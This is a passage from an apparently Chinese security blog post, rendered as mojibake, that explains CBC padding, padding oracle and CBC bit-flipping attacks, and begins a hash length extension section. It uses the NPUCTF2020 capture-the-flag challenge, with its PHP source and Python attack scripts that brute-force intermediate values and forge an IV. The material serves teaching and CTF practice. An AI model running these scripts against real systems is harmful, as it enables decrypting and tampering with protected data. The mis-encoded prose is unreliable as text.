å¯†ï¼Œæ­¤æ—¶æœ€åä¸€ä¸ªåˆ†ç»„å°±ä¸ä¼šè¢«å æ»¡ï¼ˆè¿˜å·®ä¸€ä¸ªå­—èŠ‚å æ»¡ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™è¦æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>è¿™æ—¶å€™å°±éœ€è¦å¯¹æœ€åä¸€ä¸ªåˆ†ç»„è¿›è¡Œå¡«å……ï¼Œå°†å…¶å¡«å……æ»¡ã€‚<br>å¯¹äºé‡‡ç”¨desç®—æ³•åŠ å¯†çš„å†…å®¹ï¼Œå¡«å……è§„åˆ™æ˜¯PKC #5,è€ŒAESæ˜¯ PKC #7.<br>è¿™ä¸¤è€…å”¯ä¸€åŒºåˆ«æ˜¯ PKCS #5å¡«å……æ˜¯å…«å­—èŠ‚åˆ†ç»„è€ŒPKCS #7æ˜¯åå…­å­—èŠ‚ ï¼Œè¿˜è®°å¾—ä¸Šé¢æˆ‘ä»¬è¯´è¿‡çš„ DESåˆ†ç»„é•¿åº¦æ˜¯å…«å­—èŠ‚è€ŒAESåˆ†ç»„é•¿åº¦æ˜¯åå…­å­—èŠ‚ å—ï¼Ÿå°±æ˜¯è¿™ä¸ªåˆ†ç»„å­—èŠ‚æ•°å½±å“äº†å¡«å……æ–¹å¼ã€‚</p><p>é‚£ä¹ˆå…·ä½“æ˜¯æ€ä¹ˆå¡«å……çš„å‘¢ï¼Œæˆ‘ä»¬ä»¥PKC #5ä¸ºä¾‹</p><p><img src="https://image.3001.net/images/20171018/15083384721064.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ"></p><p>å½“æœ€åä¸€ç»„è¿˜å‰©nä¸ªå­—èŠ‚æœªè¢«å¡«å……æ—¶ï¼Œå°±ä¼šå¡«å……nä¸ª 0xnå­—ç¬¦ä¸Šå».<br>ä¸Šå›¾æ˜¯PKCS #5,å…¶å®PKCS #7å’ŒPKCS #5åŸç†æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡æ˜¯åˆ†ç»„å­—èŠ‚æ•°å¤§äº†ç‚¹ç½¢äº†ï¼ˆ0~16ï¼‰</p><h2 id="Padding-oracle-attack"><a href="#Padding-oracle-attack" class="headerlink" title="Padding oracle attack"></a>Padding oracle attack</h2><p>ä¸Šé¢åªæ˜¯é“ºå«ï¼Œå»ºè®®å­¦æ‡‚äº†å†æ¥çœ‹è¿™ä¸ªæ”»å‡»æ–¹å¼ã€‚ä¸ç„¶ä¼šéå¸¸å¤´å¤§ã€‚</p><h3 id="Padding-oracle-attack-æ”»å‡»åœºæ™¯ä¸¾ä¾‹"><a href="#Padding-oracle-attack-æ”»å‡»åœºæ™¯ä¸¾ä¾‹" class="headerlink" title="Padding oracle attack æ”»å‡»åœºæ™¯ä¸¾ä¾‹"></a>Padding oracle attack æ”»å‡»åœºæ™¯ä¸¾ä¾‹</h3><p>é¦–å…ˆæˆ‘ä»¬å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œä»è€Œå¼•å‡ºè¿™ä¸ªæ”»å‡»ã€‚</p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶åŒ…å«åœºæ™¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>é»‘å®¢ä»¬çœ‹è§äº†å°±ä¼šå¾ˆè½»è€Œæ˜“ä¸¾çš„å»åŒ…å«æƒ³è¦çš„æ–‡ä»¶ã€‚ç®¡ç†è€…å‘ç°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¯¹fileå‚æ•°é‡‡ç”¨äº†CBCåŠ å¯†ï¼Œå³å½“æäº¤è¯·æ±‚æ—¶ï¼Œfileå‚æ•°çš„å€¼æ˜¯è¢«åŠ å¯†çš„ï¼Œç„¶åæœåŠ¡å™¨ç”¨ç®—æ³•è§£å¯†å¾—åˆ°å…¶æƒ³åŒ…å«çš„æ–‡ä»¶ï¼Œç„¶åè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url?file&#x3D;e28b2e3c972edab8 å…¶ä¸­å‰8ä½æ•°æ˜¯IVï¼Œåå…«ä½æ•°æ˜¯å¯†æ–‡ã€‚ï¼ˆè¿™é‡Œæ˜¯æˆ‘çå†™çš„å¯†æ–‡&#x3D; &#x3D;ï¼Œä½ åªéœ€è¦ç†è§£åˆ°è¿™é‡Œæ˜¯ä¸€ä¸ªCBCåŠ å¯†åçš„å¯†æ–‡å°±è¡Œäº†ï¼‰</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•å»å®ç°æˆ‘ä»¬çš„ä»»æ„æ–‡ä»¶åŒ…å«å‘¢? padding oracle attack å‡ºç°äº†ã€‚</p><h3 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h3><p>å‡è®¾æˆ‘ä»¬å‘åˆšåˆšé‚£ä¸ªä»»æ„æ–‡ä»¶åŒ…å«çš„æäº¤äº†ä¸€æ®µå¯†æ–‡ã€‚æœåŠ¡å™¨å°±ä¼šå°è¯•è§£å¯†ï¼Œå°±ä¼šå‡ºç°ä¸‰ç§ç»“æœã€‚</p><p>1.å¯†æ–‡ä¸èƒ½æ­£å¸¸è§£å¯†ï¼Œè¿™ç§åŸå› æ˜¯åœ¨äºæœ€åä¸€ç»„çš„å¡«å……å­—èŠ‚å‡ºç°äº†é”™è¯¯<br>2.å¯†æ–‡èƒ½æ­£å¸¸è§£å¯†ä½†è§£å¯†å‡ºæ¥çš„æ–‡ä»¶è·¯å¾„ä¸å­˜åœ¨<br>3.å¯†æ–‡èƒ½æ­£å¸¸è§£å¯†ä¸”èƒ½æˆåŠŸåŒ…å«</p><p>å…¶ä¸­ç¬¬1ç§æƒ…å†µå’Œ2.3ç§æƒ…å†µç½‘é¡µè¿”å›çš„å†…å®¹è‚¯å®šæ˜¯ä¸åŒçš„ã€‚<br>æ¯”å¦‚è¯´ç¬¬ä¸€ç§æƒ…å†µå¯èƒ½å°±ç›´æ¥è¿”å›500äº†ï¼Œ2.3å¯èƒ½å°±æ˜¯302è·³è½¬å•¥å•¥çš„ï¼Œé€šè¿‡è¿™ä¸ªç½‘é¡µè¿”å›çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±æœ‰äº†å¯ä¹˜ä¹‹æœºã€‚</p><p>æˆ‘ä»¬å…ˆé€šè¿‡ä¸€ä¸ªå›¾æ„Ÿå—ä¸€ä¸‹ç¬¬ä¸€ç»„çš„è§£å¯†æµç¨‹</p><p><img src="https://image.3001.net/images/20171019/15083434757270.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ"></p><p>å¥½çš„å¥½çš„ï¼Œæ„Ÿå—äº†è¿™ä¸ªè§£å¯†æµç¨‹åï¼Œæˆ‘ä»¬æ¥è¯´è¯´æ”»å‡»çš„äº‹ã€‚<br>å¦‚æœæˆ‘ä»¬å¾—åˆ°äº† Intermediary Value(ä¸­é—´å€¼)ï¼Œå¹¶ä¸”å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹IVï¼Œé‚£ä¹ˆæˆ‘ä»¬å²‚ä¸æ˜¯å¯ä»¥æ„é€ ä»»æ„Decrypted Valueï¼ˆæ˜æ–‡ï¼‰äº†ï¼Ÿ<br>æ‰€ä»¥padding oracle attack çš„æ ¸å¿ƒå°±æ˜¯å»è·å¾—ä¸­é—´å€¼ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆå»è·å–å‘¢ï¼Ÿ</p><p>è¿˜è®°å¾—åˆšåˆšæåˆ°çš„3ç§æƒ…å†µå—ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹IVï¼Œé€šè¿‡åˆ¤æ–­ç½‘é¡µè¿”å›å†…å®¹æ¥åˆ¤æ–­ä¸­é—´å€¼ï¼Œå…·ä½“åšæ³•å¦‚ä¸‹:</p><p>æˆ‘ä»¬å…ˆæŠŠIVå…¨éƒ¨è®¾ç½®ä¸º0x00ï¼Œç„¶åä¿®æ”¹IVçš„æœ€åä¸€ä¸ªæ•°ï¼Œå½“å…¶ä¸ä¸­é—´å€¼XORåçš„å€¼ä¸º0x01åˆ™æ­¤æ—¶è§£å¯†å°±ä¼šæˆåŠŸï¼Œè‹¥ä¸æ˜¯0x01è§£å¯†å°±ä¼šå¤±è´¥ï¼Œç½‘é¡µä¼šè¿”å›ä¸åŒçš„å†…å®¹ï¼Œä»¥æ­¤æ¥åˆ¤æ–­ä½•æ—¶è§£å¯†æˆåŠŸã€‚ç„¶åæŠŠè§£å¯†æˆåŠŸæ—¶çš„IVçš„æœ€åä¸€ä½æ•°ä¸0x01è¿›è¡Œå¼‚æˆ–è®¡ç®—ï¼Œå³å¯å¾—åˆ°ä¸­é—´å€¼çš„æœ€åä¸€ä½</p><p><img src="https://image.3001.net/images/20171019/15083441758558.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ"></p><p>ç„¶åæˆ‘ä»¬æŠŠIVæœ€åä¸€ä½æ•°è®¾ç½®ä¸ºèƒ½å’Œä¸­é—´å€¼æœ€åä¸€ä½æ•°å¼‚æˆ–åå€¼ä¸º0x02çš„æ•°ï¼Œç©·ä¸¾IVå€’æ•°ç¬¬äºŒä¸ªæ•°çœ‹çœ‹å“ªä¸ªæ•°èƒ½å’Œä¸­é—´å€¼å€’æ•°ç¬¬äºŒä¸ªæ•°å¼‚æˆ–è¿ç®—åå€¼ä¸º0x02ï¼Œç„¶åæˆ‘ä»¬å°±å¯å¾—åˆ°ä¸­é—´å€¼å€’æ•°ç¬¬äºŒä¸ªæ•°ï¼Œä»¥æ­¤ç±»æ¨å¯ä»¥è·å¾—ç¬¬ä¸€ç»„çš„ä¸­é—´å€¼ï¼ˆæœ‰ç‚¹ç»•ï¼‰<br>ç„¶åç ´è§£åˆ°äº†ä¸­é—´å€¼æˆ‘ä»¬å†ç”¨æœ€å¼€å§‹çš„IVï¼ˆä¸æ˜¯æˆ‘ä»¬åé¢æ„é€ çš„IVï¼‰å»å’Œä¸­é—´å€¼å¼‚æˆ–å°±å¾—åˆ°æ˜æ–‡äº†<br>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å†æ¬¡æ„é€ IVï¼Œä»è€Œæ„é€ è§£å¯†å‡ºæ¥çš„å­—ç¬¦ï¼ˆé€šè¿‡ä¸­é—´å€¼ä¸IVå¼‚æˆ–ï¼‰</p><h2 id="NPUCTF2020-webğŸ•ä¸­çš„Padding-oracle-Attack"><a href="#NPUCTF2020-webğŸ•ä¸­çš„Padding-oracle-Attack" class="headerlink" title="[NPUCTF2020]webğŸ•ä¸­çš„Padding oracle Attack"></a>[NPUCTF2020]webğŸ•ä¸­çš„Padding oracle Attack</h2><p>æˆ‘ä»¬ä»¥è¿™é“é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼Œè¯¦ç»†çœ‹çœ‹å¦‚ä½•å®ç°æ”»å‡»ã€‚<br>æœ¬é¢˜å°±æ˜¯ä»¥ä¸‹ä»£ç ï¼Œæˆ‘ä»¬è¦æƒ³æ–¹è®¾æ³•å…ˆæ‹¿åˆ°$flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;config.php&#39;);   # $key,$flag</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);  &#x2F;&#x2F;å®šä¹‰åŠ å¯†æ–¹å¼</span><br><span class="line">define(&quot;SECRET_KEY&quot;, $key);    &#x2F;&#x2F;å®šä¹‰å¯†é’¥</span><br><span class="line">define(&quot;IV&quot;,&quot;6666666666666666&quot;);    &#x2F;&#x2F;å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6</span><br><span class="line">define(&quot;BR&quot;,&#39;&lt;br&gt;&#39;);</span><br><span class="line">if(!isset($_GET[&#39;source&#39;]))header(&#39;location:.&#x2F;index.php?source&#x3D;1&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#var_dump($GLOBALS);   &#x2F;&#x2F;å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ</span><br><span class="line">function aes_encrypt($iv,$data)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;--------encrypt---------&quot;.BR;</span><br><span class="line">    echo &#39;IV:&#39;.$iv.BR;</span><br><span class="line">    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line">function aes_decrypt($iv,$data)</span><br><span class="line">&#123;</span><br><span class="line">    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;); &#x2F;&#x2F;åªèƒ½è¿”å›1æˆ–false</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#39;method&#39;]&#x3D;&#x3D;&#39;encrypt&#39;)</span><br><span class="line">&#123;</span><br><span class="line">    $iv &#x3D; IV;</span><br><span class="line">    $data &#x3D; $flag;    </span><br><span class="line">    echo aes_encrypt($iv,$data);</span><br><span class="line">&#125; else if($_GET[&#39;method&#39;]&#x3D;&#x3D;&quot;decrypt&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    $iv &#x3D; @$_POST[&#39;iv&#39;];</span><br><span class="line">    $data &#x3D; @$_POST[&#39;data&#39;];</span><br><span class="line">    echo aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯&quot;.BR;</span><br><span class="line"></span><br><span class="line">if($_GET[&#39;source&#39;]&#x3D;&#x3D;1)highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæ‹¿åˆ°å¯†æ–‡ ly7auKVQCZWum/W/4osuPA==<br>ç„¶åå¯¹å…¶è¿›è¡Œbase64è§£å¯†ï¼Œå‘ç°å…¶åˆšå¥½æ˜¯æœ‰16ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ç©·ä¸¾IVå¾—åˆ°ä¸­é—´å€¼ï¼Œç„¶åå‡­æ­¤ä¸åˆå§‹IVï¼ˆ16ä¸ª6ï¼‰è¿›è¡Œå¼‚æˆ–å¾—åˆ°æ˜æ–‡$flag.</p><p>è¯ä¸å¤šè¯´ï¼Œçˆ†ç ´ä¸­é—´å€¼çš„è„šæœ¬å®‰æ’ä¸Šã€‚(å€Ÿé‰´äº†ä¸€ä¸ªå¤§ä½¬çš„WPï¼‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">Intermediary&#x3D;&quot;&quot;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;de1650aa-2b24-40e0-bb51-736ff5d38269.node3.buuoj.cn&#x2F;&#x2F;index.php?source&#x3D;1&amp;method&#x3D;decrypt&quot;</span><br><span class="line">iv&#x3D;&quot;&quot;</span><br><span class="line">hexs&#x3D;&quot;&quot;</span><br><span class="line">IV&#x3D;&quot;6666666666666666&quot;</span><br><span class="line">def xor(a,b):</span><br><span class="line">    return &quot;&quot;.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))])</span><br><span class="line"></span><br><span class="line">for step in range(1,17):</span><br><span class="line">    padding&#x3D;chr(step)*(step-1)</span><br><span class="line">    print(&quot;ç¬¬%sè½®&quot;%step)</span><br><span class="line">    for i in range(0,256):</span><br><span class="line">        iv&#x3D;chr(0)*(16-step)+chr(i)+xor(Intermediary,padding)</span><br><span class="line">        post&#x3D;&#123;</span><br><span class="line">            &quot;iv&quot;:iv,</span><br><span class="line">            &quot;data&quot;:&quot;ly7auKVQCZWum&#x2F;W&#x2F;4osuPA&#x3D;&#x3D;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        r&#x3D;requests.post(url&#x3D;url,data&#x3D;post,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        print(r.text+&quot;ç¬¬%sè½®i&#x3D;%s &quot;%(step,i))</span><br><span class="line">        if &quot;False&quot; !&#x3D;  r.text:</span><br><span class="line">            Intermediary&#x3D;xor(chr(i),chr(step))+Intermediary</span><br><span class="line">            print(Intermediary)</span><br><span class="line">            break</span><br><span class="line">for k in range(len(Intermediary)):</span><br><span class="line">    hexs&#x3D;&quot;%&quot;+str(ord(Intermediary[k]))+hexs</span><br><span class="line">print(hexs)</span><br><span class="line">print(xor(Intermediary,IV))</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºäº†ä¸­é—´å€¼å’Œ$flagæ˜æ–‡</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152650.png" alt="QQæˆªå›¾20210217152650"></p><p>è¿™é‡Œæœ‰äº›ç–‘æƒ‘ï¼Œä¸ºå•¥ä¸­é—´å€¼ä¼šæ˜¯15ä½çš„â€¦<br>å‘ç°$flagä¸æ˜¯æœ€ç»ˆflagï¼Œè‡³äºæ¥ä¸‹æ¥è¦åšçš„ä¸œè¥¿ï¼Œå°±æ˜¯CBCå­—èŠ‚ç¿»è½¬æ”»å‡»äº†</p><h2 id="CBCç¿»è½¬å­—èŠ‚æ”»å‡»"><a href="#CBCç¿»è½¬å­—èŠ‚æ”»å‡»" class="headerlink" title="CBCç¿»è½¬å­—èŠ‚æ”»å‡»"></a>CBCç¿»è½¬å­—èŠ‚æ”»å‡»</h2><p>åœ¨å¯¹CBCæ¨¡å¼åŠ å¯†çš„æ•°æ®è¿›è¡Œè§£å¯†æ—¶ï¼Œè‹¥ivå¯æ§ï¼Œåˆ™å¯ä»¥ä»»æ„æ§åˆ¶è§£å¯†åçš„å†…å®¹ã€‚<br>CBCç¿»è½¬å­—èŠ‚æ”»å‡»ä¸åŒäºpadding oracle attackï¼Œåè€…çš„æ ¸å¿ƒæ˜¯IVå¯æ§æƒ…å†µä¸‹è·å–ä¸­é—´å€¼ï¼Œä»è€Œå¯ä»¥è·å¾—æ˜æ–‡æˆ–è€…ä»»æ„æ§åˆ¶å¯†æ–‡è§£å¯†åçš„æ•°æ®ã€‚<br>è€ŒCBCç¿»è½¬å­—èŠ‚æ”»å‡»çš„æ ¸å¿ƒæ€æƒ³å°±ä¸æ˜¯è·å–ä¸­é—´å€¼äº†ï¼Œè€Œæ˜¯åœ¨IVå¯æ§çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ç®—æ³•ç¼ºé™·æ¥ç›´æ¥æ§åˆ¶å¯†æ–‡è§£å¯†åçš„æ•°æ®ã€‚</p><p>ç°åœ¨å‡å®šæœ‰ä¸­é—´å€¼A,æ˜æ–‡B1,IV C1<br>é‚£ä¹ˆå°±æœ‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A^B1&#x3D;c1</span><br></pre></td></tr></table></figure><p>ä¸€ç‚¹é”™è¯¯éƒ½æ²¡æœ‰å¯¹å§ã€‚<br>ç°åœ¨åˆå‡å®šæœ‰ä¸­é—´å€¼A,æˆ‘ä»¬æƒ³è¦è§£å¯†å‡ºçš„æ˜æ–‡B2å’Œä¸ä¹‹å¯¹åº”çš„IV C2<br>é‚£ä¹ˆå°±æœ‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A^B2&#x3D;C2</span><br><span class="line">ç»“åˆä»¥ä¸Šä¸¤ä¸ªå¼å­ï¼Œæœ‰</span><br><span class="line">A&#x3D;B1^C1&#x3D;B2^C2</span><br><span class="line">äºæ˜¯æœ‰</span><br><span class="line">B2&#x3D;B1^C1^C2</span><br><span class="line">æˆ–C2&#x3D;B1^B2^C1</span><br><span class="line">è‹¥æˆ‘ä»¬å·²çŸ¥B1,C1,ä¸”C2å¯æ§,é‚£ä¹ˆB2å³å¯æ§</span><br><span class="line">æ—¢æ»¡è¶³åˆšåˆšæˆ‘ä»¬è¯´çš„ï¼Œé€šè¿‡ç®—æ³•ç¼ºé™·æ¥ç›´æ¥æ§åˆ¶å¯†æ–‡è§£å¯†åçš„æ•°æ®ã€‚</span><br></pre></td></tr></table></figure><p>è¿™ï¼Œå°±æ˜¯CBCç¿»è½¬å­—èŠ‚æ”»å‡»ï¼Œæ²¡å¤ªæ‡‚æ²¡äº‹ï¼Œçœ‹ä¾‹å­å°±è¡Œäº†</p><h2 id="NPUCTF2020-webğŸ•ä¸­çš„CBCç¿»è½¬å­—èŠ‚æ”»å‡»"><a href="#NPUCTF2020-webğŸ•ä¸­çš„CBCç¿»è½¬å­—èŠ‚æ”»å‡»" class="headerlink" title="[NPUCTF2020]webğŸ•ä¸­çš„CBCç¿»è½¬å­—èŠ‚æ”»å‡»"></a>[NPUCTF2020]webğŸ•ä¸­çš„CBCç¿»è½¬å­—èŠ‚æ”»å‡»</h2><p>è·Ÿè¿›æˆ‘ä»¬åˆšåˆšè®²çš„ï¼ŒFlagIsHere.php,æ ¸å¿ƒä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X5uucFgPTVdCo9f3ZHGP8g&#x3D;&#x3D;</span><br><span class="line">&lt;?php </span><br><span class="line">#error_reporting(0);</span><br><span class="line">include(&#39;config.php&#39;);    &#x2F;&#x2F;$fl4g</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;6666666&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_iv()&#123;    &#x2F;&#x2F;ç”Ÿæˆéšæœºåˆå§‹å‘é‡IV</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala &#x3D; &#39;piapiapiapia&#39;;</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&#39;Identity&#39;]))&#123;</span><br><span class="line">    $_SESSION[&#39;iv&#39;] &#x3D; get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#39;Identity&#39;] &#x3D; base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[&#39;iv&#39;]));</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode($_SESSION[&#39;iv&#39;]).&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;iv&#39;]))&#123;</span><br><span class="line">    $tmp_id &#x3D; openssl_decrypt(base64_decode($_SESSION[&#39;Identity&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[&#39;iv&#39;]));</span><br><span class="line">    echo $tmp_id.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    if($tmp_id &#x3D;&#x3D;&#x3D;&#39;weber&#39;)die($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å·²çŸ¥åˆå§‹IV,åˆå§‹å¯†æ–‡ï¼Œä¸”IVå¯æ§ï¼Œé‚£ä¹ˆCBCç¿»è½¬å­—èŠ‚æ”»å‡»æ¡ä»¶æˆç«‹ï¼Œå¯ä»¥æ”»å‡»ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œè´´ä¸€ä¸ªåˆ«äººå†™çš„python2 CBCå­—èŠ‚åè½¬æ”»å‡»è„šæœ¬</span><br><span class="line">è‡ªå·±æ‹¿python3å†™äº†åŠå¤©éƒ½æ²¡å†™å‡ºå¾ˆå¥½çš„æ•ˆæœ...</span><br><span class="line">import base64</span><br><span class="line">def bxor(b1, b2): # use xor for bytes</span><br><span class="line">    parts &#x3D; []</span><br><span class="line">    for b1, b2 in zip(b1, b2):</span><br><span class="line">        parts.append(bytes([b1 ^ b2]))</span><br><span class="line">    return b&#39;&#39;.join(parts)</span><br><span class="line">iv &#x3D; base64.b64decode(&quot;h34HL5RbMPw8oTaQ+P58nw&#x3D;&#x3D;&quot;)</span><br><span class="line">text &#x3D; b&quot;piapiapiapia\x04\x04\x04\x04&quot;</span><br><span class="line">result &#x3D; b&quot;weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&quot;</span><br><span class="line">middle &#x3D; bxor(iv,text)</span><br><span class="line">iv &#x3D; bxor(middle,result)</span><br><span class="line">print(base64.b64encode(iv))</span><br></pre></td></tr></table></figure><p>æŠŠè·‘å‡ºæ¥çš„ç»“æœPOSTè¿‡å»ï¼Œå°±ä¼šå¾—åˆ°ä¸‹ä¸€æ­¥äº†..</p><h1 id="Hashé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#Hashé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="Hashé•¿åº¦æ‰©å±•æ”»å‡»"></a>Hashé•¿åº¦æ‰©å±•æ”»å‡»</h1><p>1 byte=8 bit</p><h2 id="hashç®—æ³•"><a href="#hashç®—æ³•" class="headerlink" title="hashç®—æ³•"></a>hashç®—æ³•</h2><h3 id="Merkleâ€“Damgardæ„é€ "><a href="#Merkleâ€“Damgardæ„é€ " class="headerlink" title="Merkleâ€“DamgÃ¥rdæ„é€ "></a>Merkleâ€“DamgÃ¥rdæ„é€ </h3><p>æ˜“å—hashé•¿åº¦æ‰©å±•æ”»å‡»çš„ç®—æ³•æœ‰ SHAç³»åˆ—ä¸MDç³»åˆ—ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯åŸºäºMerkleâ€“DamgÃ¥rdæ„é€ ã€‚å…·ä½“å®ƒæ˜¯æ€ä¹ˆç»“æ„ï¼Œä»ä¸‹æ–‡çš„MD5ç®—æ³•å¯ä»¥æ„Ÿå—åˆ°</p><h3 id="MD5ç®—æ³•"><a href="#MD5ç®—æ³•" class="headerlink" title="MD5ç®—æ³•"></a>MD5ç®—æ³•</h3><h4 id="åˆ†ç»„"><a href="#åˆ†ç»„" class="headerlink" title="åˆ†ç»„"></a>åˆ†ç»„</h4><p>MD5ç®—æ³•é‡Œï¼Œä¼šå…ˆè®¾ç½®å¥½ä¸€ä¸ªä¸€ä¸ªçš„åˆ†ç»„ï¼Œæ¯ä¸ªç»„çš„å¤§å°æ˜¯512bitæˆ–è€…è¯´æ˜¯64bytesã€‚</p><p>æ¯ä¸ªç»„éƒ½åŒ…å«2ä¸ªéƒ¨åˆ†:<br>1.æ•°æ®åŒºï¼Œå 56bytesæ¥è®°å½•éœ€è¦è¢«åŠ å¯†çš„å­—ç¬¦ä¸²æ•°æ®ï¼Œå½“æ•°æ®æ— æ³•å¡«æ»¡æ•°æ®åŒºæ—¶ï¼Œä¼šè¿›è¡Œâ€è¡¥ä½â€æ“ä½œ(è¯·çœ‹ä¸‹æ–‡è§£é‡Š)<br>2.é•¿åº¦æè¿°ç¬¦åŒº,ç”¨äºè®°å½•â€œéè¡¥ä½â€æ•°æ®çš„å¤§å°,å 8ä¸ªbyteï¼Œå…¶å€¼ä¸ºè¯¥ç»„æ•°æ®åŒºç§éè¡¥ä½æ•°æ®çš„bitå¤§å°çš„16è¿›åˆ¶å€¼ã€‚<br>æ¯”å¦‚éè¡¥ä½æ•°æ®æ˜¯admin,å…¶å 5ä¸ªbyteï¼Œ40ä¸ªbitï¼Œ40çš„åå…­è¿›åˆ¶æ˜¯28ï¼Œæ‰€ä»¥å…¶å€¼ä¼šæ˜¯28ã€‚<br>ç„¶åè¿™ä¸ªå€¼ä¼šä»¥ä¸€ç§å«åšå°ç«¯å­˜å‚¨çš„æ–¹å¼è®°å½•åˆ°é•¿åº¦æè¿°ç¬¦åŒºã€‚<br>ï¼ˆéè¡¥ä½æ•°æ®æŒ‡è¯¥ç»„çš„éå¡«å……çš„æ•°æ®ï¼Œå³çœŸæ­£éœ€è¦è¢«åŠ å¯†çš„å­—ç¬¦ä¸²ï¼‰</p><h4 id="è¡¥ä½"><a href="#è¡¥ä½" class="headerlink" title="è¡¥ä½"></a>è¡¥ä½</h4><p>å¾ˆç®€å•ï¼Œè‹¥æŸä¸ªç»„çš„æ•°æ®é•¿åº¦å°äº56byteï¼Œè¯¥ç»„çš„æ•°æ®åŒºä¸ä¼šè¢«å æ»¡ï¼Œé‚£ä¹ˆå°±ä¼šè‡ªåŠ¨è¡¥ä½æ¥ä½¿æ•°æ®åŒºè¢«å¡«æ»¡ã€‚</p><p>å…¶è§„åˆ™æ˜¯åœ¨æ•°æ®åå…ˆæ·»åŠ ä¸€ä¸ª80å­—èŠ‚ï¼Œç„¶åå†ç”¨00å­—èŠ‚å¡«å……å®Œæ•´ä¸ªæ•°æ®åŒºã€‚</p><h4 id="åˆ†ç»„ä¸è¡¥ä½å°ç»“"><a href="#åˆ†ç»„ä¸è¡¥ä½å°ç»“" class="headerlink" 